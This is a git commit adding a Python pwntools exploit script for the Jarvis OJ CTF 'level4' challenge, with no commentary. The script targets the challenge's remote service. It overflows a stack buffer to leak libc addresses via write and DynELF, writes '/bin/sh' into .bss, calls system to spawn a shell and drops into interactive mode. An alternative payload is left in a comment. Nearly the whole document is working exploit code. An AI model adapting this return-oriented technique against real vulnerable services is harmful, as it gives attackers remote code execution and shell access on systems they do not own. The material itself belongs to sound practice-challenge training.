48dbf40a15c8f888202d48b931817af72ecd7d96
Railgun <40140600+R4ilgun@users.noreply.github.com>
2020-02-06 17:15:22 +0800

    Create exp.py

---
+++ Jarvis OJ/level4/exp.py
@@ -0,0 +1,46 @@
+#! /usr/bin/python
+
+from pwn import *
+from LibcSearcher import *
+
+p = remote('pwn2.jarvisoj.com',9880)
+#p = process('./level4')
+elf = ELF('./level4')
+#context.log_level = 'debug'
+
+
+write_plt = elf.symbols['write']
+write_got = elf.got['write']
+offset = 0x88
+vul = 0x804844B
+pppr = 0x08048509
+
+
+def leak(address):
+	payload = 'A' * offset + 'dead' + p32(write_plt) + p32(vul) + p32(1) + p32(address) + p32(0x4)
+	p.sendline(payload)
+	data = p.recv(4)
+	return data
+
+
+d = DynELF(leak,elf=ELF('./level4'))
+system = d.lookup('system', 'libc')
+read = elf.symbols['read']
+bss = elf.symbols['__bss_start']
+
+
+payload = 'A' * offset + 'dead' + p32(read) + p32(pppr) + p32(0) + p32(bss) + p32(8)
+payload+= p32(system) + p32(32) + p32(bss)
+p.sendline(payload)
+p.send("/bin/sh\0")
+
+'''
+payload = 'A' * offset + 'dead' + p32(read) + p32(vul) + p32(0) + p32(bss) + p32(8)
+p.sendline(payload)
+p.sendline('/bin/sh\x00')
+
+payload = 'A' * offset + 'dead' + p32(system) + 'dead' + p32(bss)
+p.sendline(payload)
+'''
+
+p.interactive()
